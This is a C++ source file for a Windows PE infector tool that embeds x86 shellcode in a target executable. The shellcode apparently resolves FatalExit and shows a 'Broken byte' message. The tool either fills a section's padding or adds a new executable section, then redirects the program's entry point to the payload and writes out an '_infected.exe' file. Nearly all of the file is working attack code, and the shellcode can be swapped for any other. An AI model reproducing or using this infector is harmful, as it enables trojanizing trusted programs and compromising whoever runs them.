#include <iostream>
#include <windows.h>
#include <w32api.h>
#include <Shlwapi.h>
#include <unistd.h>

using namespace std;

typedef struct PE_INFO {
    INT Size;
    INT StartOffset;
    INT EndOffset;

} PE_INFO, *PPE_INFO;


char code[] =
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
"\x49\x0b\x31\xc0\x51\x50\xff\xd7";

bool readBinFile(const char fileName[], char** bufPtr, DWORD& length){
    FILE* file;
    if (file = fopen(fileName, "rb")){
        fseek(file, 0, SEEK_END);
        length = ftell(file);
        *bufPtr = new char[length + 1];
        fseek(file, 0, SEEK_SET);
        fread(*bufPtr, sizeof(char), length, file);
        return true;
    }
    else {
        return false;
    }
}

int getAllign(int size, int allign){
    return ((size / allign) + 1) * allign;
}

size_t rvaToOffset(DWORD RVA, IMAGE_NT_HEADERS* ntHdr, IMAGE_SECTION_HEADER* sctHdr){
    for(int i=0; i< ntHdr->FileHeader.NumberOfSections; i++){
        auto curSct = sctHdr[i];
        if(RVA >= curSct.VirtualAddress &&
                RVA <= curSct.VirtualAddress + curSct.Misc.VirtualSize){
            return curSct.PointerToRawData + (RVA - curSct.VirtualAddress);
        }
    }
    return 0;
}

size_t offsetToRva(DWORD raw_offset ,IMAGE_NT_HEADERS* ntHdr, IMAGE_SECTION_HEADER* sctHdr){
    for(int i=0; i< ntHdr->FileHeader.NumberOfSections; i++){
        auto curSct = sctHdr[i];
        if(raw_offset >= curSct.PointerToRawData &&
                raw_offset <= curSct.PointerToRawData + curSct.SizeOfRawData){
            return curSct.VirtualAddress + (raw_offset - curSct.PointerToRawData);
        }

    }
    return 0;
}

void findPEInfo(IMAGE_NT_HEADERS* ntHdr, IMAGE_SECTION_HEADER* secHdr, char* ptrToPad, char* outfile, PPE_INFO peInfo){

    int endOffset = 0;
    int startOffset = 0;

    for(auto i=0; i < ntHdr->FileHeader.NumberOfSections; i++){
        auto nextSect = secHdr[i+1];
        int startOffset = nextSect.PointerToRawData - 1;
        ptrToPad = outfile+startOffset;
        while(!(*ptrToPad) && (secHdr[i].SizeOfRawData > 0)){
            ptrToPad -=1;
        }

        ptrToPad +=1;
        startOffset = ptrToPad - outfile;
        endOffset = nextSect.PointerToRawData - 1;
        int sizeOfPad = endOffset - startOffset + 1;
        peInfo[i].Size = sizeOfPad;
        peInfo[i].StartOffset = startOffset;
        peInfo[i].EndOffset = endOffset;

        if(sizeOfPad > sizeof(code)){
            printf("[+] find %d padding in section %i\n", sizeOfPad, i+1);
            //printf("[+] start @ 0x%08x, end @ 0x%08x\n", (ntHdr->OptionalHeader.ImageBase), (ntHdr->OptionalHeader.ImageBase));
            printf("[+] start offset @ 0x%x end offset @ 0x%x \n\n", startOffset, endOffset);
        }
    }

}


int createNewSect(char *buff, DWORD fileSize,char *outfile, char *fileName){

    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*) buff;
    IMAGE_NT_HEADERS* ntHdr = (IMAGE_NT_HEADERS*) (size_t(dosHdr)+dosHdr->e_lfanew);
    IMAGE_SECTION_HEADER* secHdr = (IMAGE_SECTION_HEADER*)(size_t(ntHdr) + sizeof(*ntHdr));
    if(dosHdr->e_magic != IMAGE_DOS_SIGNATURE || ntHdr->Signature != IMAGE_NT_SIGNATURE){
        puts("[-] file may be broken");
        return 1;
    }

    auto fileAllign = ntHdr->OptionalHeader.FileAlignment;
    auto sectAllign = ntHdr->OptionalHeader.SectionAlignment;
    auto finalSize = fileSize + getAllign(sizeof(code), fileAllign);

    outfile = (char*)malloc(finalSize);
    puts("[+] copying original exe to new file");
    memcpy(outfile, buff, fileSize);


    IMAGE_DOS_HEADER* newDosHdr = (IMAGE_DOS_HEADER*) outfile;
    IMAGE_NT_HEADERS* newNtHdr = (IMAGE_NT_HEADERS*) (size_t(newDosHdr)+newDosHdr->e_lfanew);
    IMAGE_SECTION_HEADER* newSecHdr = (IMAGE_SECTION_HEADER*)(size_t(newNtHdr) + sizeof(*newNtHdr));

    if(newDosHdr->e_magic != IMAGE_DOS_SIGNATURE || newNtHdr->Signature != IMAGE_NT_SIGNATURE){
        puts("[-] file may be broken");
        return 1;
    }

    PIMAGE_SECTION_HEADER lastSectHdr = &newSecHdr[newNtHdr->FileHeader.NumberOfSections - 1];
    PIMAGE_SECTION_HEADER newSectHdr2 = lastSectHdr + 1;

    puts("[+] creating new section header");
    memcpy(newSectHdr2->Name, "new.scn", 8);

    //memory SET ALLIGN FOR RAW DATA!!
    newSectHdr2->SizeOfRawData = sizeof(code) + (fileAllign - (sizeof(code) % getAllign(sizeof(code), fileAllign)));
    newSectHdr2->Misc.VirtualSize = getAllign(sizeof(code), sectAllign);

    //Execute, read
    newSectHdr2->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;

    //virtual address
    //get shift from base address of image
    //note that you should use sectAllign because it is in sect header.
    newSectHdr2->VirtualAddress = getAllign(lastSectHdr->VirtualAddress + lastSectHdr->Misc.VirtualSize, sectAllign);
    newSectHdr2->PointerToRawData = lastSectHdr->PointerToRawData + lastSectHdr->SizeOfRawData;
    newNtHdr->FileHeader.NumberOfSections += 1;

    //Pointer is  the shift from base image address !!!!!!!!!eror
    memcpy(outfile + newSectHdr2->PointerToRawData, code, sizeof(code));

    puts("[+] repair virtual size");
    for (size_t i = 0; i < newNtHdr->FileHeader.NumberOfSections - 1; i++){
        newSecHdr[i].Misc.VirtualSize = newSecHdr[i+1].VirtualAddress - newSecHdr[i].VirtualAddress;
    }

    puts("[+] fix image size in memory");
    newNtHdr->OptionalHeader.SizeOfImage = newSectHdr2->VirtualAddress + newSectHdr2->Misc.VirtualSize;

    puts("[+] point EP to shellcode");
    newNtHdr->OptionalHeader.AddressOfEntryPoint = newSectHdr2->VirtualAddress;

    char outputPath[40];
    memcpy(outputPath, fileName, sizeof(outputPath));
    strncpy(strrchr(outputPath, '.'), "_infected.exe", 40);
    FILE* fout = fopen(outputPath, "wb");
    fwrite(outfile, 1, finalSize, fout);
    fclose(fout);

    printf("[+] file saved at %s\n", outputPath);
    puts("[+] done");

}


int injectInPadding(char *buff, DWORD fileSize,char *outfile, char *fileName, int number){
    IMAGE_DOS_HEADER* dsHdr = (IMAGE_DOS_HEADER*)buff;
    IMAGE_NT_HEADERS* ntHdr = (IMAGE_NT_HEADERS*)(size_t(dsHdr) + dsHdr->e_lfanew);
    IMAGE_SECTION_HEADER* secHdr = (IMAGE_SECTION_HEADER*)(size_t(ntHdr) + sizeof(*ntHdr));
    //применяется при выравнивании сырой программы
    auto fileAllign = ntHdr->OptionalHeader.FileAlignment;
    //применяется при выравнивании в памяти
    auto sectAllign = ntHdr->OptionalHeader.SectionAlignment;

    if(dsHdr->e_magic != IMAGE_DOS_SIGNATURE || ntHdr->Signature != IMAGE_NT_SIGNATURE){
        puts("[!] file may be broken!");
        return 1;
    }

    outfile = (char*)malloc(fileSize);
    memcpy(outfile, buff, fileSize);

    IMAGE_DOS_HEADER* newDosHdr = (IMAGE_DOS_HEADER*) outfile;
    IMAGE_NT_HEADERS* newNtHdr = (IMAGE_NT_HEADERS*) (size_t(newDosHdr)+newDosHdr->e_lfanew);
    IMAGE_SECTION_HEADER* newSecHdr = (IMAGE_SECTION_HEADER*)(size_t(newNtHdr) + sizeof(*newNtHdr));

    char* ptrToPad;
    puts("[+] finding size of padding in the sections");
    number -= 1;

    PPE_INFO peInfo = new PE_INFO[ntHdr->FileHeader.NumberOfSections];
    findPEInfo(ntHdr, secHdr, ptrToPad, outfile, peInfo);
    
    printf("[+] check if there is enough place for shellcode \n");
    int endOffset = 0;
    int startOffset = 0;

    // !!!!
    if(!(peInfo[number].Size > 0)){
        printf("[-] cant't inject in section %i", number+1);
        return 1;
    }
// !! ПРОВРИТЬ разрешение на исполнение в секции в которой заинжектился shellcode
    int shell_start_offset = peInfo[number].StartOffset;
    int shell_end_offset = shell_start_offset + sizeof(code);
    ptrToPad = outfile + shell_start_offset;
    printf("[+] insert payload at @ 0x%08x \n", ptrToPad);


    memcpy(ptrToPad, code, sizeof(code));
    printf("[+] payload injected in %i section at @  0x%08x \n", number+1, ptrToPad);
    printf("[+] check characteristics \n");

    if(newSecHdr[number].Characteristics != (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ)){

        newSecHdr[number].Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
        printf("[+] change characteristics to read and exec");

    }

    auto rva_address = offsetToRva(shell_start_offset, newNtHdr, newSecHdr);
    int entry = (DWORD)(rva_address);
    newNtHdr->OptionalHeader.AddressOfEntryPoint = entry;


    char outputPath[40];
    memcpy(outputPath, fileName, sizeof(outputPath));
    strncpy(strrchr(outputPath, '.'), "_infected.exe", 40);
    FILE* fout = fopen(outputPath, "wb");
    fwrite(outfile, 1, fileSize, fout);
    fclose(fout);
    printf("[+] file saved at %s\n", outputPath);
    puts("[+] done");


}

int main(int argc, char** argv)
{
    int rezult = 0;
    char* buff;
    DWORD fileSize;
    char* injected;
    char* fileName;

    while((rezult = getopt(argc, argv, "f:np:h")) != -1){
        switch(rezult) {
        case 'f':{
            if(!readBinFile(optarg, &buff, fileSize)){
                puts("[-] can't open file");
                return 1;
            }
            fileName = optarg;
            break;
        }
        case 'n':{
            createNewSect(buff, fileSize, injected, fileName);
            break;
        }
        case 'p':{
            int number;

            if(optarg){
                number = char(*optarg) - 48;
            }
            else{
                number = 1;
            }

            injectInPadding(buff, fileSize, injected, fileName, number);
            break;
        }
        case 'h':{
            puts("[!] usage ./PePathcer.exe -f [path/to/file] [-p/-n]\n");
            puts("[info] -p [section number(default=1)] -> inject payload in padding, -n -> create new section with payload");
            return 1;
        }
        case '?':{
            puts("[!] usage ./PePathcer.exe [path/to/file] [-p/-n]\n");
            puts("[info] -p [section number(default=1)] -> inject payload in padding, -n -> create new section with payload");
            return 1;
        }
        }

    }

//    if (argc != 3) {
//        puts("[!] usage ./PePathcer.exe [path/to/file] [-p/-n]\n");
//        puts("[info] -p -> inject payload in padding, -n -> create new section with payload");
//        return 1;

//    }


//    if(!readBinFile(argv[1], &buff, fileSize)){
//        puts("[-] can't open file");
//        return 1;
//    }

//    char* word = argv[2]+1;
//    if (*word == 'n'){
//        createNewSect(buff, fileSize, injected, argv[1]);
//    }

//    if (*word == 'p'){
//        injectInPadding(buff, fileSize, injected, argv[1]);
//    }
    return 0;
}
